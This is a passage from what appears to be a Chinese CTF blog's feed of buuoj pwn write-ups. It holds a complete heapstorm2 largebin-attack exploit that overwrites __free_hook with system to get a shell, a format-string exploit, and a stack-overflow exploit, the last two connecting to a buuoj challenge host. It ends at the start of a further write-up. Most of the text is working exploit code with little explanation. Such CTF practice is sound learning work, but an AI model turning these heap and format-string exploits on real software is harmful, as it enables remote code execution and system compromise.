lbase <span class="token operator">=</span> u64<span class="token punctuation">(</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x7f4ef5812b78</span> <span class="token operator">-</span> <span class="token number">0x7f4ef544e000</span><span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'lbase'</span><span class="token punctuation">,</span> lbase<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>之后就改free_hook成system，然后getshell</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">__free_hook <span class="token operator">=</span> lbase <span class="token operator">+</span> ctx<span class="token punctuation">.</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
system <span class="token operator">=</span> lbase <span class="token operator">+</span> ctx<span class="token punctuation">.</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
leak<span class="token punctuation">(</span><span class="token string">'__free_hook'</span><span class="token punctuation">,</span> __free_hook<span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">,</span> system<span class="token punctuation">)</span>

pay <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x13377331</span><span class="token punctuation">)</span>  <span class="token comment"># view</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>storage<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span>  <span class="token comment"># node0: ptr,size</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>__free_hook<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># node1: ptr, size</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>storage<span class="token operator">+</span><span class="token number">0x50</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># node2: ptr. size</span>
pay <span class="token operator">+=</span> <span class="token string">'/bin/sh\x00'</span> <span class="token comment"># storage+0x50</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> pay<span class="token punctuation">)</span>

edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>完整exp：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#coding=utf8</span>
<span class="token comment">#!/usr/bin/python2</span>

<span class="token keyword">from</span> PwnContext <span class="token keyword">import</span> <span class="token operator">*</span>
      
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'gnome-terminal'</span><span class="token punctuation">,</span> <span class="token string">'-x'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span><span class="token punctuation">,</span> <span class="token string">'-c'</span><span class="token punctuation">]</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
<span class="token comment"># functions for quick script</span>
s       <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#in case that data is an int</span>
sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>delim<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>delim<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
r       <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>
ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims<span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span>  <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">,</span> drop<span class="token punctuation">)</span>
irt     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
rs      <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
dbg     <span class="token operator">=</span> <span class="token keyword">lambda</span> gs<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>gdbscript<span class="token operator">=</span>gs<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
<span class="token comment"># misc functions</span>
uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
leak    <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'&#123;&#125; = &#123;:#x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

ctx<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./0ctf_2018_heapstorm2'</span>
ctx<span class="token punctuation">.</span>remote <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
ctx<span class="token punctuation">.</span>remote_libc <span class="token operator">=</span> <span class="token string">'../../libc/libc-2.23.so'</span>
ctx<span class="token punctuation">.</span>debug_remote_libc <span class="token operator">=</span> <span class="token boolean">True</span>


<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'Command: '</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'Command: '</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'Command: '</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'Command: '</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">']: '</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> r<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>

    rs<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># rs('remote')</span>
    <span class="token comment"># print(ctx.libc.path)</span>


    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token comment"># 0</span>
    add<span class="token punctuation">(</span><span class="token number">0x508</span><span class="token punctuation">)</span> <span class="token comment"># 1</span>
    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token comment"># 2</span>

    <span class="token comment"># 待会mallc(0x18)的时候，会根据1找到下一个chunk的pre_size，与size相等才通过检查</span>
    edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x4f0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># next = chunk+size(改成0x500)</span>


    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token comment"># 3</span>
    add<span class="token punctuation">(</span><span class="token number">0x508</span><span class="token punctuation">)</span> <span class="token comment"># 4</span>
    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token comment"># 5</span>
    edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x4f0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token comment"># 6</span>

    free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># chunk2 pre_size=0x510, inuse=0</span>
    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'h'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x18</span> <span class="token operator">-</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># chunk1 size=0x500</span>

    <span class="token comment"># 一共0x500</span>
    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token comment"># 1</span>
    add<span class="token punctuation">(</span><span class="token number">0x4d8</span><span class="token punctuation">)</span> <span class="token comment"># 7</span>

    <span class="token comment"># chunk1+chunk2合并，node7指向chunk1+0x20+0x10</span>
    free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>

    add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">)</span> <span class="token comment"># 1</span>
    add<span class="token punctuation">(</span><span class="token number">0x4e8</span><span class="token punctuation">)</span> <span class="token comment"># 2</span>

    <span class="token comment"># 4和8重叠</span>
    free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
    edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'h'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x18</span> <span class="token operator">-</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token comment"># 4</span>
    add<span class="token punctuation">(</span><span class="token number">0x4d8</span><span class="token punctuation">)</span> <span class="token comment"># 8</span>
    free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
    free<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">)</span> <span class="token comment"># 4</span>


    free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0x4e8</span><span class="token punctuation">)</span> <span class="token comment"># 2</span>
    free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>

    <span class="token comment"># modify fake chunk size</span>
    storage <span class="token operator">=</span> <span class="token number">0x13370000</span> <span class="token operator">+</span> <span class="token number">0x800</span>
    fake_chunk <span class="token operator">=</span> storage <span class="token operator">-</span> <span class="token number">0x20</span>

    pay <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4f1</span><span class="token punctuation">)</span> <span class="token comment"># size</span>
    pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span> <span class="token comment"># bk</span>
    edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> pay<span class="token punctuation">)</span>

    pay <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4e1</span><span class="token punctuation">)</span> <span class="token comment"># size</span>
    pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_chunk <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># bk</span>
    pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_chunk<span class="token operator">-</span><span class="token number">0x18</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token comment"># bk_nextsize</span>
    edit<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> pay<span class="token punctuation">)</span>

    <span class="token comment">#break</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">)</span> <span class="token comment"># 2</span>
        ru<span class="token punctuation">(</span><span class="token string">'1.'</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>
        <span class="token keyword">continue</span>

    <span class="token keyword">break</span>


pay <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x13377331</span><span class="token punctuation">)</span>  <span class="token comment"># view</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>storage<span class="token punctuation">)</span>   <span class="token comment"># node0: ptr</span>
edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> pay<span class="token punctuation">)</span>


<span class="token comment"># leak heap</span>
<span class="token comment"># node1 ptr = 0x133707e3, *ptr=0xxxxx060 这是之前构造0x56size字段时弄的堆地址，可以leak出堆 </span>
pay <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x13377331</span><span class="token punctuation">)</span>  <span class="token comment"># view</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>storage<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span>  <span class="token comment"># node0: ptr,size</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x133707e3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># node1: ptr, size</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> pay<span class="token punctuation">)</span> 

heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'heap'</span><span class="token punctuation">,</span> heap<span class="token punctuation">)</span>

<span class="token comment"># leak libc</span>
<span class="token comment"># 根据这个堆地址，可以leak出main_arena</span>
pay <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x13377331</span><span class="token punctuation">)</span>  <span class="token comment"># view</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>storage<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span>  <span class="token comment"># node0: ptr,size</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>heap<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># node1: ptr, size</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> pay<span class="token punctuation">)</span>

lbase <span class="token operator">=</span> u64<span class="token punctuation">(</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x7f4ef5812b78</span> <span class="token operator">-</span> <span class="token number">0x7f4ef544e000</span><span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'lbase'</span><span class="token punctuation">,</span> lbase<span class="token punctuation">)</span>

<span class="token comment"># modify __free_hook</span>
__free_hook <span class="token operator">=</span> lbase <span class="token operator">+</span> ctx<span class="token punctuation">.</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
system <span class="token operator">=</span> lbase <span class="token operator">+</span> ctx<span class="token punctuation">.</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
leak<span class="token punctuation">(</span><span class="token string">'__free_hook'</span><span class="token punctuation">,</span> __free_hook<span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">,</span> system<span class="token punctuation">)</span>

pay <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x13377331</span><span class="token punctuation">)</span>  <span class="token comment"># view</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>storage<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span>  <span class="token comment"># node0: ptr,size</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>__free_hook<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># node1: ptr, size</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>storage<span class="token operator">+</span><span class="token number">0x50</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># node2: ptr. size</span>
pay <span class="token operator">+=</span> <span class="token string">'/bin/sh\x00'</span> <span class="token comment"># storage+0x50</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> pay<span class="token punctuation">)</span>

edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>

<span class="token comment">#dbg()</span>


irt<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>buuoj题目复现</category>
      </categories>
      <tags>
        <tag>largebin attack</tag>
        <tag>heapstorm2</tag>
      </tags>
  </entry>
  <entry>
    <title>第五空间2019pwn5</title>
    <url>/eb2e947b/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>buuoj刷pwn题之第五空间2019pwn5</p>
<span id="more"></span>
<p>白给题，格式化字符串漏洞</p>
<p><img src="/images/eb2e947b/1.png" alt="upload successful"></p>
<p>exp:</p>
<pre><code class="python=">from pwn import *

context.terminal = [&apos;gnome-terminal&apos;, &apos;-x&apos;, &apos;sh&apos;, &apos;-c&apos;]

addr = 0x0804C044

pay = &apos;%12$saaa&apos; + p32(addr)
#p = process(&apos;./pwn&apos;)
p = remote(&apos;node3.buuoj.cn&apos;, 26394)
p.sendafter(&apos;:&apos;, pay)

p.recvuntil(&apos;,&apos;)

passwd = u32(p.recv(4))
print hex(passwd)

#gdb.attach(p)

p.send(str(passwd)+&apos;\x00&apos;)

p.interactive()</code></pre>
]]></content>
      <categories>
        <category>buuoj题目复现</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>格式化字符串漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>ZCTF_2019_Login</title>
    <url>/982ea662/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>buuoj刷pwn题之ZCTF_2019_Login</p>
<span id="more"></span>


<p><img src="/images/982ea662/1.png" alt="upload successful"><br><img src="/images/982ea662/2.png" alt="upload successful"></p>
<p>这里解引用了两次，只要能修改a1指向的内存即可</p>
<p>关键在这：</p>
<p><img src="/images/982ea662/3.png" alt="upload successful"></p>
<p>返回了函数局部变量的地址（危险操作）</p>
<p>exp:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'gnome-terminal'</span><span class="token punctuation">,</span> <span class="token string">'-x'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span><span class="token punctuation">,</span> <span class="token string">'-c'</span><span class="token punctuation">]</span>

pay <span class="token operator">=</span> <span class="token string">'2jctf_pa5sw0rd\x00'</span>
pay <span class="token operator">+=</span> <span class="token string">'\x00'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x48</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token punctuation">)</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400E88</span><span class="token punctuation">)</span>

<span class="token comment">#p = process('./login')</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">25069</span><span class="token punctuation">)</span>
<span class="token comment">#gdb.attach(p, 'b *0x0400B93')</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>buuoj题目复现</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>ACTF_2019_onerepeater</title>
    <url>/7cf334f5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>buuoj刷pwn题之ACTF_2019_onerepeater</p>
<span id="more"></span>

<p>目测是shellcode</p>
<p><img src="/images/7cf334f5/1.png" alt="checksec"></p>
<p>两种操作</p>
<p><img src="/images/7cf334f5/2.png" alt="operate"></p>
<p>repeat操作，有格式化字符串漏洞：</p>
<p><img src="/images/7cf334f5/3.png" alt="repeat"></p>
